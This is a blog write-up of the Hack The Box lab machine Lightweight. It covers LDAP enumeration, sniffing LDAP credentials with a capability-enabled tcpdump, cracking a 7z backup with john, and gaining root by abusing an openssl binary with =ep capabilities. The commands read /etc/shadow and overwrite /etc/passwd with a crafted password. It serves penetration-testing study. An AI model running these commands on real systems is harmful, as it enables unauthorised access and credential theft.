---
layout: post
title:  "Lightweight Writeup - Hack The Box"
date:   2025-05-18
desc: ""
keywords: "HTB,eWPT,OSWE,OSCP,Linux,LDAP,Abusing Capabilities,Wireshark,Bruteforce,OpenSSL,Medium"
categories: [HTB]
tags: [HTB,eWPT,OSWE,OSCP,Linux,LDAP,Abusing Capabilities,Wireshark,Bruteforce,OpenSSL,Medium]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

Another brilliant **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** box, the machine combines different methods of exploiting vulnerabilities in order to engage. While the techniques to perform the attacks are not very complex and are well known in the area of **Information Security**, the real challenge is to recognize what to do and how to do it, so I had to test my lateral thinking and think outside the box. I'm already anxious to start this lab, classified as **Medium**, so I sign in to my **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** account and spawn it.

<br /><br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I start the **Reconnaissance** phase, but first I'm going to check the connectivity with the lab, for this I'm going to use `ping` to send a trace and everything is correct. With the tool `whichSystem.py` from **[hack4u](https://hack4u.io/){:target="_blank"}** I check that the **OS** installed on the machine is **Linux** and I can list the ports exposed in the target with `nmap`. Once I have the ports, I can get the services and their versions thanks to the `nmap` scripts (**LDAP** is enabled, how interesting). In **Launchpad** I can know the **codename** of the machine if I use the version of the available services, there is a possibility that containers are being deployed since I got different codenames. With `whatweb` I leak information of the technologies used in the web service on port **80** (using the **IP** and the **domain** is the same) and with **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}** it doesn't give me much more.

```bash
ping -c 1 10.10.10.119
whichSystem.py 10.10.10.119
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.119 -oG allPorts
nmap -sCV -p22,80,389 10.10.10.119 -oN targeted
#    --> OpenSSH 7.4
#    --> Apache httpd 2.4.6
#    --> OpenLDAP 2.2.X - 2.3.X

whatweb http://10.10.10.119
nvim /etc/hosts
cat /etc/hosts | tail -n 2
ping -c 1 lightweight.htb
whatweb http://lightweight.htb
```

<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I'm going to focus my efforts on the web service available on port **80**, at the beginning I find a warning about the protection against brute force attack, most likely there is a **[fail2ban](https://www.digitalocean.com/community/tutorials/how-fail2ban-works-to-protect-services-on-a-linux-server){:target="_blank"}** deployed. There are several resources (all with **.php** extension) that inform me about **IP banning** in case of not allowed actions, also that I can connect by **SSH** using the **IP** assigned by **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** to the target machine and I can reset the box in case of any inconvenience. All this information is very likely to be useful for the compromise, but I can't find more information so I'm going to use a `nmap` script to **[enumerate LDAP](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ldap.html?highlight=ldap#ldap-anonymous-binds){:target="_blank"}**, but except for some passwords (which by their format don't seem crackable) and usernames I can't find much information that will help me for the moment.

> **[Fail2Ban](**[Hack The Box](https://www.hackthebox.com){:target="_blank"}**){:target="_blank"}** is an open-source intrusion prevention software framework that protects Linux servers from brute-force attacks by monitoring log files and dynamically blocking **IP** addresses. It works by analyzing log entries for suspicious activity, such as repeated failed login attempts, and then modifying firewall rules to temporarily ban the offending IP addresses.

```bash
locate .nse | grep 'ldap'
nmap --script ldap-search -p389 10.10.10.119 -oN ldapScan
```

<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

As it allows me to access the system using the **SSH** protocol, I connect using my assigned **IP** as username and password. Using some basic enumeration commands I find that the **Polkits** `pkexec` tool has **SUID** permissions, which is very likely to make the system vulnerable to **[pwnKit](https://github.com/ly4k/PwnKit){:target="_blank"}** but is not the intended path so I continue my enumeration. There is a very interesting **[capabilitie](https://man7.org/linux/man-pages/man7/capabilities.7.html){:target="_blank"}** assigned to the `tcpdump` binary which **[allows me as an unprivileged user to capture packets](https://staff.washington.edu/shrike/unix/linux/how-to-enable-users-to-capture-packets/){:target="_blank"}** on the network, so I'm going to do a capture of all network interfaces to see if I find anything interesting. After waiting a while I try to transfer the generated file to my machine (for analysis) in different ways until I can get it with `base64`.

> CAP_NET_ADMIN: Perform various network-related operations.

> CAP_NET_RAW: Use RAW and PACKET sockets, bind to any address for transparent proxying.

> **Victime Machine**:

```bash
ssh 10.10.14.22@10.10.10.119

whoami
hostname
hostname -I
id
groups
cat /etc/passwd | grep 'sh$'
find \-perm -4000 2>/dev/null
getcap / -r 2>/dev/null
# /usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep

tcpdump -i any -w capture.cap -v
# :) wait a moment, at least 800 packets
which nc
which python3
which python2
which python
```

> **Attacker Machine**:

```bash
wget http://10.10.10.119:8080/capture.cap
```

> **Victime Machine**:

```bash
base64 -w 0 capture.cap; echo
```

> **Attacker Machine**:

```bash
echo "1MOyoQIA.....AAAAAAA=" | base64 -d > capture.cap
```

<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I check with `md5sum` the integrity of the transferred file and then with `wireshark` I will analyze the packets. Of all the captured packets I do not find much information that allows me to understand some attack vector or even to continue enumerating, there are many related to the **SSH** service but not to **LDAP**. If I capture with `tcpdump` packets exclusively from port **22** there is traffic but not from **LDAP** port **389**.

> **Victime Machine**:

```bash
md5sum capture.cap
```

> **Attacker Machine**:

```bash
md5sum capture.cap

wireshark capture.cap &>/dev/null
# ldap :(

tcpdump -i any -w capture.cap -v "port 22"
tcpdump -i any -w capture.cap -v "port 389"
# :(
```

<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

After a while of rethinking what I am overlooking, I remember the information messages on the web page and more precisely the **account reset**, maybe I should perform actions on the web so I can capture **LDAP** related traffic, since this protocol is related to account management (**among many other tasks**). I start capturing packets with `tcpdump` (from port **389** specifically) using some parameters to get the information in a readable format and perform actions on the web, after a while I can get information in my shell and finally some credentials of the user **ldapuser2**.

```bash
tcpdump -i any -w capture.cap -v "port 389"
# :)

man tcpdump
# -n            Don't convert addresses (i.e., host addresses, port numbers, etc.) to names.
# -s snaplen    Snarf  snaplen bytes of data from each packet rather than the default of 262144 bytes.
# -X            When parsing and printing, in addition to printing the headers of each packet, print the data of each packet (minus its link level header) in hex and ASCII.

tcpdump -i lo -nnXs 0 'port 389'
# :)
```

<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

There is a way to capture packets with `tcpdump` directly on my attacking machine, using the command execution that `ssh` allows me to perform. There are some `wireshark` parameters that I must take into account so that the interface that I start capturing immediately is the one provided by `tcpdump` but from the connection that I establish with `ssh`. Then I can interact with the web and start capturing packets related to **LDAP** and with the `wireshark` filters I find again the credentials of the user **ldapuser2**.

```bash
sshpass -p '10.10.14.2' ssh 10.10.14.2@10.10.10.119 "whoami"
sshpass -p '10.10.14.2' ssh 10.10.14.2@10.10.10.119 "uname -a"

wireshark --help | grep -E '\-k|\-i'
# -i <interface>, --interface <interface>
# -k                       start capturing immediately (def: do nothing)

sshpass -p '10.10.14.2' ssh 10.10.14.2@10.10.10.119 "/usr/sbin/tcpdump -i any -w -" | wireshark -k -i - &>/dev/null
# http://lightweight.htb/status.php <-- is the key :)
```

<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_29.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_30.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_31.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now that I can perform a **User Pivoting**, I find a compressed file that may be a **backup** of a project or directory, I will have to analyze it, I also have access to the first flag. I also have to use `base64` to transfer the file, as with `ssh` it does not allow me, most likely due to permissions because the file is owned by **root**. I check with `md5sum` the integrity of it so that the content has not been compromised in the transfer.

> **Victime Machine**:

```bash
su ldapuser2
```

> **Attacker Machine**:

```bash
sshpass -p '10.10.14.2' scp 10.10.14.2@10.10.10.119:/home/ldapuser2/user.txt ./backup.7z
# :(
```

> **Victime Machine**:

```bash
base64 -w 0 backup.7z; echo
```

> **Attacker Machine**:

```bash
echo "N3q8ryccAAQm....wEwAA" | base64 -d > backup.7z
md5sum backup.7z
```

> **Victime Machine**:

```bash
md5sum backup.7z
```

<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_32.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_33.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_34.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

If I scan the contents of the archive with `7z`, it looks like it contains the web service files but if I try to extract them I can't as it **is password protected**. There is a tool in **Linux** that allows me to get the hash of the archive, `7z2john`, and then with `john` I can crack the hash using the **rockyou.txt** dictionary (in case the password is covered). After waiting a while I get the password to access the contents of the compressed file.

```bash
file backup.7z
7z l backup.7z
7z x backup.7z
# :(

locate 7z2john
7z2john
7z2john backup.7z
7z2john backup.7z > hash

john -w=$(locate rockyou.txt)                                 # [Tab]
john -w=/usr/share/wordlists/rockyou.txt hash
```

<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_35.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_36.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_37.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_38.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I already have all the compressed files available and in the content of one of them I find hardcoded the credentials of the other user of the system, **ldapuser1**, and I can perform another **User pivoting**. Once I have access to the home directory of the new engaged account I have access to some very interesting files, by name. In one of them I only find the credentials of the user **ldapuser1** but nothing else.

> **Attacker Victime**:

```bash
7z x backup.7z
cat status.php
sshpass -p 'f3ca----32d' ssh ldapuser1@10.10.10.119
# :(

sshpass -p '10.10.14.2' ssh 10.10.14.2@10.10.10.119
```

> **Victime Machine**:

```bash
su ldapuser1
# :)
cd ~
ls -la
```

<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_39.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_40.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_41.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_42.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now the other two files are the most interesting, as they turn out to be exact copies of the system binaries, `tcpdump` and `openssl`, as the hashes I obtained with `md5sum` match in both cases. Another interesting fact is the openssl capability (**ep**) and if I search in **[GTFObins](https://gtfobins.github.io/gtfobins/openssl/){:target="_blank"}** I find a command to be able to read sensitive files with this tool. If I use system `openssl` I can't access the **shadow** file, but I can with the copy of this binary. So to **Escalate privileges** are simple, I create a backup of the **passwd** file, then I generate a password with `openssl`, the next is to hardcode the previously generated password in the backup file and finally use the `openssl` command (that I find in **[GTFObins](https://gtfobins.github.io/gtfobins/openssl/){:target="_blank"}**) to replace the original **passwd** file with the backup. Now I can escalate privileges using the password I generated and access the contents of the last flag. Finally I have already engaged the box.

> In essence, if a binary has a capability set to **"ep"**, it can directly use that capability without requiring any further action to promote it to the effective set. This can be useful for granting specific privileges to a non-root user without giving them full **root** access.

```bash
file openssl
file tcpdump
# executables!

md5sum $(which openssl)
md5sum openssl
which tcpdump
md5sum $(!!)
md5sum tcpdump 

getcap -r * 2>/dev/null
# openssl =ep
# --> openssl =ep --> ALL the capabilites permitted (p) and effective (e)

openssl enc -in /etc/shadow 
# :(
./openssl enc -in /etc/shadow | head -n 8

cat /etc/passwd > malicious_passwd
openssl passwd

vi malicious_passwd
cat malicious_passwd | head -n 1
# :)

./openssl enc -in ./malicious_passwd -out /etc/passwd
su root
whoami
```

<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_43.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_44.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_45.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> What a great experience it is to face this kind of machines, where one must rethink things and adjust the attack vector to finally succeed in the goal of engaging the lab. It is a huge satisfaction to have that technique that you try over and over again, work in the end and allow you to keep moving forward. **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** provides excellent machines, not only because of the vulnerabilities to exploit, but also because of the configuration they have, which I imagine must take a huge investment of time, imagination and effort. It is time to choose the new box to engage, but first I must kill this one.

<br /><br />
<img src="{{ site.img_path }}/lightweight_writeup/Lightweight_46.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
